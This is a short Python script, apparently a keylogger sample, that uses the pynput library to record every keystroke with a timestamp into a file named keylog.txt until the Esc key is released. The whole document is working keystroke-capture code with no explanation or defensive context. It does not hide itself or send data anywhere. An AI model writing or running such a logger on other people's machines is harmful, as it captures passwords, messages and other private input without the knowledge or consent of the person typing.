import pynput
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylog.txt"),
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
